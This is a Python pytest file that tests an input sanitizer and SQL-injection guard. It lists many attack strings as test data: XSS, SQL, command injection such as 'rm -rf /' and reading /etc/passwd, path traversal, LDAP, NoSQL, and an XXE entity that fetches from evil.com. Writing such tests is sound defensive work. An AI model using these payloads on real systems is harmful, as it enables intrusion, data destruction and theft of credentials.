"""
Security Testing Suite - Input Validation
Comprehensive security tests for input validation and sanitization.
"""

from unittest.mock import patch

import pytest

from pynomaly.domain.exceptions import SecurityError, ValidationError
from pynomaly.infrastructure.security.input_sanitizer import InputSanitizer
from pynomaly.infrastructure.security.sql_protection import SQLProtection


class TestInputSanitizer:
    """Test suite for input sanitization security."""

    @pytest.fixture
    def sanitizer(self):
        """Create input sanitizer with default configuration."""
        return InputSanitizer(
            mode="strict",
            max_length=1000,
            allowed_html_tags=["b", "i", "em", "strong"],
            blocked_patterns=[
                r"<script.*?>",
                r"javascript:",
                r"on\w+\s*=",
                r"eval\s*\(",
                r"document\.",
                r"window\.",
            ],
        )

    @pytest.fixture
    def permissive_sanitizer(self):
        """Create permissive sanitizer for testing."""
        return InputSanitizer(
            mode="permissive",
            max_length=5000,
            allowed_html_tags=["p", "br", "strong", "em", "ul", "ol", "li", "a"],
            allowed_attributes=["href", "title", "class"],
        )

    # Basic Sanitization Tests

    def test_sanitize_clean_text(self, sanitizer):
        """Test sanitization of clean text input."""
        clean_text = "This is a normal text input with no special characters."
        result = sanitizer.sanitize(clean_text)

        assert result == clean_text
        assert sanitizer.is_safe(clean_text)

    def test_sanitize_html_entities(self, sanitizer):
        """Test HTML entity encoding."""
        html_input = "<div>Hello & goodbye</div>"
        result = sanitizer.sanitize(html_input)

        # Should encode HTML entities
        assert "&lt;div&gt;" in result
        assert "&amp;" in result

    def test_sanitize_allowed_html_tags(self, sanitizer):
        """Test handling of allowed HTML tags."""
        allowed_input = "This is <b>bold</b> and <i>italic</i> text."
        result = sanitizer.sanitize(allowed_input)

        # Allowed tags should be preserved
        assert "<b>bold</b>" in result
        assert "<i>italic</i>" in result

    def test_sanitize_disallowed_html_tags(self, sanitizer):
        """Test removal of disallowed HTML tags."""
        disallowed_input = "Click <button onclick='alert()'>here</button>"
        result = sanitizer.sanitize(disallowed_input)

        # Disallowed tags should be encoded or removed
        assert "<button" not in result
        assert "onclick" not in result

    def test_sanitize_length_limit(self, sanitizer):
        """Test input length limits."""
        long_input = "x" * 2000  # Exceeds max_length of 1000

        with pytest.raises(ValidationError, match="Input too long"):
            sanitizer.sanitize(long_input)

    # XSS Prevention Tests

    def test_xss_script_tag_prevention(self, sanitizer):
        """Test prevention of script tag XSS."""
        xss_inputs = [
            "<script>alert('XSS')</script>",
            "<script src='malicious.js'></script>",
            "<SCRIPT>alert('XSS')</SCRIPT>",  # Case variation
            "<<script>alert('XSS')</script>",  # Double encoding
            "<script\x20type='text/javascript'>alert('XSS')</script>",
        ]

        for xss_input in xss_inputs:
            result = sanitizer.sanitize(xss_input)

            # Should not contain executable script tags
            assert "<script" not in result.lower()
            assert "alert(" not in result

    def test_xss_event_handler_prevention(self, sanitizer):
        """Test prevention of event handler XSS."""
        xss_inputs = [
            "<img src='x' onerror='alert(1)'>",
            "<div onmouseover='alert(1)'>text</div>",
            "<input onfocus='alert(1)'>",
            "<body onload='alert(1)'>",
            "<a href='#' onclick='alert(1)'>link</a>",
        ]

        for xss_input in xss_inputs:
            result = sanitizer.sanitize(xss_input)

            # Should not contain event handlers
            assert "onerror" not in result
            assert "onmouseover" not in result
            assert "onfocus" not in result
            assert "onload" not in result
            assert "onclick" not in result

    def test_xss_javascript_url_prevention(self, sanitizer):
        """Test prevention of javascript: URL XSS."""
        xss_inputs = [
            "<a href='javascript:alert(1)'>link</a>",
            "<img src='javascript:alert(1)'>",
            "<iframe src='javascript:alert(1)'></iframe>",
            "<object data='javascript:alert(1)'></object>",
        ]

        for xss_input in xss_inputs:
            result = sanitizer.sanitize(xss_input)

            # Should not contain javascript: URLs
            assert "javascript:" not in result.lower()

    def test_xss_data_url_prevention(self, sanitizer):
        """Test prevention of data: URL XSS."""
        xss_inputs = [
            "<img src='data:text/html,<script>alert(1)</script>'>",
            "<object data='data:text/html,<script>alert(1)</script>'></object>",
            "<iframe src='data:text/html,<script>alert(1)</script>'></iframe>",
        ]

        for xss_input in xss_inputs:
            result = sanitizer.sanitize(xss_input)

            # Should not contain malicious data URLs
            assert "data:text/html" not in result
            assert "<script>" not in result

    def test_xss_css_expression_prevention(self, sanitizer):
        """Test prevention of CSS expression XSS."""
        xss_inputs = [
            "<div style='background:expression(alert(1))'>text</div>",
            "<p style='width:expression(alert(1))'>text</p>",
            "<span style='behavior:url(#default#AnchorClick)'>text</span>",
        ]

        for xss_input in xss_inputs:
            result = sanitizer.sanitize(xss_input)

            # Should not contain CSS expressions
            assert "expression(" not in result
            assert "behavior:" not in result

    # SQL Injection Prevention Tests

    def test_sql_injection_basic_prevention(self):
        """Test prevention of basic SQL injection."""
        sql_protection = SQLProtection()

        sql_inputs = [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "admin'--",
            "' UNION SELECT * FROM passwords--",
            "1; DELETE FROM users; --",
        ]

        for sql_input in sql_inputs:
            assert not sql_protection.is_safe(sql_input)

            with pytest.raises(SecurityError):
                sql_protection.validate_input(sql_input)

    def test_sql_injection_advanced_prevention(self):
        """Test prevention of advanced SQL injection techniques."""
        sql_protection = SQLProtection()

        advanced_sql_inputs = [
            "1' AND (SELECT COUNT(*) FROM users) > 0 --",
            "'; EXEC xp_cmdshell('dir'); --",
            "' OR 1=1; INSERT INTO users VALUES('hacker','pass'); --",
            "admin' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))>64--",
            "1' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a); --",
        ]

        for sql_input in advanced_sql_inputs:
            assert not sql_protection.is_safe(sql_input)

    def test_sql_injection_time_based_prevention(self):
        """Test prevention of time-based SQL injection."""
        sql_protection = SQLProtection()

        time_based_inputs = [
            "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a); --",
            "'; WAITFOR DELAY '00:00:05'; --",
            "1' AND (SELECT * FROM (SELECT(BENCHMARK(1000000,MD5(1))))a); --",
        ]

        for sql_input in time_based_inputs:
            assert not sql_protection.is_safe(sql_input)

    def test_sql_injection_legitimate_input_allowed(self):
        """Test that legitimate input is allowed."""
        sql_protection = SQLProtection()

        legitimate_inputs = [
            "John Smith",
            "user@example.com",
            "Company Ltd.",
            "Product-123",
            "Valid input with spaces",
            "Number: 12345",
        ]

        for legitimate_input in legitimate_inputs:
            assert sql_protection.is_safe(legitimate_input)

    # Command Injection Prevention Tests

    def test_command_injection_prevention(self, sanitizer):
        """Test prevention of command injection attacks."""
        command_inputs = [
            "; rm -rf /",
            "| cat /etc/passwd",
            "$(whoami)",
            "`id`",
            "&& net user hacker pass /add",
            "|| dir c:\\",
            "; shutdown -h now",
        ]

        for cmd_input in command_inputs:
            result = sanitizer.sanitize(cmd_input)

            # Should not contain command injection characters
            assert ";" not in result or result.count(";") == 0
            assert "|" not in result
            assert "$(" not in result
            assert "`" not in result

    def test_path_traversal_prevention(self, sanitizer):
        """Test prevention of path traversal attacks."""
        path_inputs = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",  # URL encoded
            "....//....//....//etc/passwd",  # Double encoding
            "..%252f..%252f..%252fetc%252fpasswd",  # Double URL encoding
        ]

        for path_input in path_inputs:
            result = sanitizer.sanitize(path_input)

            # Should not contain path traversal sequences
            assert "../" not in result
            assert "..\\" not in result
            assert "%2e%2e" not in result.lower()

    # LDAP Injection Prevention Tests

    def test_ldap_injection_prevention(self, sanitizer):
        """Test prevention of LDAP injection attacks."""
        ldap_inputs = [
            "admin)(|(password=*))",
            "*)(uid=*))(|(uid=*",
            "admin)(&(password=*)",
            "*)(objectClass=*",
            "*)(&(objectClass=user)(|(cn=*)(mail=*)))",
        ]

        for ldap_input in ldap_inputs:
            result = sanitizer.sanitize(ldap_input)

            # LDAP special characters should be escaped or removed
            assert ")(" not in result
            assert ")|(" not in result

    # XML/XXE Prevention Tests

    def test_xxe_prevention(self, sanitizer):
        """Test prevention of XML External Entity (XXE) attacks."""
        xxe_inputs = [
            "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>",
            "<!DOCTYPE test [<!ENTITY % xxe SYSTEM 'http://evil.com/evil.dtd'>%xxe;]>",
            "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///c:/windows/win.ini'>]><foo>&xxe;</foo>",
        ]

        for xxe_input in xxe_inputs:
            result = sanitizer.sanitize(xxe_input)

            # Should not contain XXE payloads
            assert "<!ENTITY" not in result
            assert "<!DOCTYPE" not in result
            assert "&xxe;" not in result

    # NoSQL Injection Prevention Tests

    def test_nosql_injection_prevention(self, sanitizer):
        """Test prevention of NoSQL injection attacks."""
        nosql_inputs = [
            '{"$where": "this.username == \'admin\'"}',
            '{"username": {"$ne": null}}',
            '{"$or": [{"username": "admin"}, {"username": "administrator"}]}',
            '{"username": {"$regex": ".*"}}',
            '{"$gt": ""}',
        ]

        for nosql_input in nosql_inputs:
            result = sanitizer.sanitize(nosql_input)

            # Should not contain NoSQL operators
            assert "$where" not in result
            assert "$ne" not in result
            assert "$or" not in result
            assert "$regex" not in result
            assert "$gt" not in result

    # Validation Tests

    def test_email_validation(self, sanitizer):
        """Test email address validation."""
        valid_emails = [
            "user@example.com",
            "test.email+tag@example.co.uk",
            "user123@test-domain.org",
        ]

        invalid_emails = [
            "invalid-email",
            "@example.com",
            "user@",
            "user..double.dot@example.com",
            "user@domain..com",
        ]

        for email in valid_emails:
            assert sanitizer.validate_email(email)

        for email in invalid_emails:
            assert not sanitizer.validate_email(email)

    def test_url_validation(self, sanitizer):
        """Test URL validation."""
        valid_urls = [
            "https://example.com",
            "http://test.example.org/path",
            "https://subdomain.example.com:8080/path?query=value",
        ]

        invalid_urls = [
            "javascript:alert(1)",
            "data:text/html,<script>alert(1)</script>",
            "ftp://unsafe-protocol.com",
            "file:///etc/passwd",
            "http://[invalid-host",
        ]

        for url in valid_urls:
            assert sanitizer.validate_url(url)

        for url in invalid_urls:
            assert not sanitizer.validate_url(url)

    def test_phone_number_validation(self, sanitizer):
        """Test phone number validation."""
        valid_phones = [
            "+1-555-123-4567",
            "(555) 123-4567",
            "555.123.4567",
            "+44 20 7946 0958",
        ]

        invalid_phones = [
            "123",
            "not-a-phone",
            "555-123-456789012345",  # Too long
            "+1-555-123-4567; DROP TABLE users; --",  # SQL injection attempt
        ]

        for phone in valid_phones:
            assert sanitizer.validate_phone(phone)

        for phone in invalid_phones:
            assert not sanitizer.validate_phone(phone)

    # Content Security Tests

    def test_file_upload_validation(self, sanitizer):
        """Test file upload content validation."""
        # Test allowed file types
        allowed_files = [
            {"filename": "data.csv", "content_type": "text/csv"},
            {"filename": "document.pdf", "content_type": "application/pdf"},
            {"filename": "image.jpg", "content_type": "image/jpeg"},
        ]

        for file_info in allowed_files:
            assert sanitizer.validate_file_upload(file_info)

        # Test dangerous file types
        dangerous_files = [
            {"filename": "script.exe", "content_type": "application/x-executable"},
            {"filename": "malware.bat", "content_type": "application/x-bat"},
            {"filename": "virus.scr", "content_type": "application/x-screensaver"},
            {
                "filename": "innocent.jpg.exe",
                "content_type": "image/jpeg",
            },  # Double extension
        ]

        for file_info in dangerous_files:
            assert not sanitizer.validate_file_upload(file_info)

    def test_file_content_scanning(self, sanitizer):
        """Test file content scanning for malicious content."""
        # Mock file content scanning
        with patch(
            "pynomaly.infrastructure.security.file_scanner.scan_content"
        ) as mock_scan:
            # Clean file content
            mock_scan.return_value = {"is_safe": True, "threats": []}
            clean_content = b"CSV,data,content\n1,2,3\n4,5,6"

            assert sanitizer.scan_file_content(clean_content)

            # Malicious file content
            mock_scan.return_value = {"is_safe": False, "threats": ["Trojan.Generic"]}
            malicious_content = b"malicious binary content"

            assert not sanitizer.scan_file_content(malicious_content)

    # Error Handling Tests

    def test_sanitization_error_handling(self, sanitizer):
        """Test error handling in sanitization process."""
        # Test None input
        with pytest.raises(ValueError):
            sanitizer.sanitize(None)

        # Test non-string input
        with pytest.raises(TypeError):
            sanitizer.sanitize(123)

        # Test binary input
        with pytest.raises(TypeError):
            sanitizer.sanitize(b"binary data")

    def test_custom_validation_rules(self, sanitizer):
        """Test custom validation rules."""

        # Add custom validation rule
        def validate_no_numbers(text):
            return not any(char.isdigit() for char in text)

        sanitizer.add_custom_validator("no_numbers", validate_no_numbers)

        # Test custom rule
        assert sanitizer.validate_custom("Hello World", "no_numbers")
        assert not sanitizer.validate_custom("Hello123", "no_numbers")

    # Performance and DoS Prevention Tests

    def test_dos_prevention_large_input(self, sanitizer):
        """Test DoS prevention with extremely large input."""
        # Test with input just at the limit
        max_input = "x" * 1000  # At max_length limit
        result = sanitizer.sanitize(max_input)
        assert len(result) <= 1000

        # Test with input exceeding limit
        oversized_input = "x" * 10000
        with pytest.raises(ValidationError):
            sanitizer.sanitize(oversized_input)

    def test_dos_prevention_complex_regex(self, sanitizer):
        """Test DoS prevention with regex complexity attacks."""
        # ReDoS attack pattern
        redos_pattern = "a" * 1000 + "X"

        # Should complete in reasonable time (not hang)
        import time

        start_time = time.time()

        try:
            sanitizer.sanitize(redos_pattern)
            execution_time = time.time() - start_time

            # Should complete within 1 second
            assert execution_time < 1.0
        except Exception:
            # Any exception is better than hanging
            pass

    def test_recursive_payload_prevention(self, sanitizer):
        """Test prevention of recursive/nested payload attacks."""
        recursive_payloads = [
            "<img src='x' onerror='<img src=x onerror=alert(1)>'>",
            "<<script>alert(1)</script>",
            "<scr<script>ipt>alert(1)</script>",
            "<svg><script>alert(1)</script></svg>",
        ]

        for payload in recursive_payloads:
            result = sanitizer.sanitize(payload)

            # Should not contain any remaining script execution
            assert "<script" not in result.lower()
            assert "onerror" not in result.lower()
            assert "alert(" not in result


class TestInputValidationIntegration:
    """Integration tests for input validation system."""

    def test_complete_input_validation_pipeline(self):
        """Test complete input validation pipeline."""
        sanitizer = InputSanitizer(mode="strict")

        # Simulate user input from web form
        user_input = {
            "name": "John <script>alert('xss')</script> Doe",
            "email": "john@example.com",
            "message": "Hello & welcome to our site!",
            "website": "https://johndoe.com",
        }

        # Process each field
        validated_input = {}

        # Name field - sanitize HTML
        validated_input["name"] = sanitizer.sanitize(user_input["name"])
        assert "<script>" not in validated_input["name"]

        # Email field - validate format
        assert sanitizer.validate_email(user_input["email"])
        validated_input["email"] = user_input["email"]

        # Message field - sanitize and allow some HTML
        validated_input["message"] = sanitizer.sanitize(user_input["message"])
        assert "&amp;" in validated_input["message"]

        # Website field - validate URL
        assert sanitizer.validate_url(user_input["website"])
        validated_input["website"] = user_input["website"]

        # All fields should be processed successfully
        assert len(validated_input) == 4

    def test_multi_layer_security_validation(self):
        """Test multi-layer security validation."""
        sanitizer = InputSanitizer(mode="strict")
        sql_protection = SQLProtection()

        # Input that contains multiple attack vectors
        malicious_input = "'; DROP TABLE users; <script>alert('xss')</script> --"

        # Layer 1: SQL injection check
        assert not sql_protection.is_safe(malicious_input)

        # Layer 2: XSS sanitization
        sanitized = sanitizer.sanitize(malicious_input)
        assert "<script>" not in sanitized

        # Layer 3: Additional validation
        assert not sanitizer.is_safe(malicious_input)

        # Multi-layer defense should catch all attack vectors
        with pytest.raises(SecurityError):
            sql_protection.validate_input(malicious_input)
